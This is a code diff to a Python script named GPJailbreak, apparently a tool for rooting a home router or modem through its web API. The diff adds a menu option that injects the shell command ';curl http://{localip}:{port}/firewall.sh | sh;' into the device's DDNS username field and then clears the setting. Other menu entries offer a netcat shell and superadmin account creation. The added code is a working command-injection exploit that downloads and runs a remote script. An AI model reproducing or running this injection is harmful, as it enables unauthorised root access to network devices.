@@ -104,7 +104,7 @@ if(session[0]):
     ddns_clear = {'Service':'Disable','UserName':'','Password':'','HostName':'','Status':'','InternetIpAddress':''}
 
     while(True):
-        print("======================================\n\n\tGPJailbreak v1.1\n\nOptions:\n\t1. Test connection\n\t2. Start netcat shell\n\t3. Disable TR-069\n\t4. Set superadmin password\n\t5. Add a superadmin account\n\t6. Unblock Command Shell\n\t7. Quit\n\n======================================")
+        print("======================================\n\n\tGPJailbreak v1.2\n\nOptions:\n\t1. Test connection\n\t2. Start netcat shell\n\t3. Disable TR-069\n\t4. Set superadmin password\n\t5. Add a superadmin account\n\t6. Unblock Command Shell\n\t7. Set proper firewall.\n\t8. Quit\n\n======================================")
         picker = input("==> ")
         match picker[0]:
             case '1':
@@ -210,6 +210,19 @@ if(session[0]):
                    print("Cant get IMEI")
                 input("Done!")
             case '7':
+                print("Firewall fixup...")
+                payload = ddns_cmd_inject
+                payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/firewall.sh | sh;"
+
+                result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
+                if(result1[0]):
+                    print(f"Sucess.")
+                time.sleep(6)
+                result2 = session_post(session_token, 'web/v1/setting/system/ddns', ddns_clear)
+                if(result2[0]):
+                   print("Settings cleanup ok")
+                input("Done!")
+            case '8':
                 print( "Logging out and exiting, bye!" )
                 print( session_post(session_token, 'web/v1/user/logout', '') )
                 payloadserver.stop()
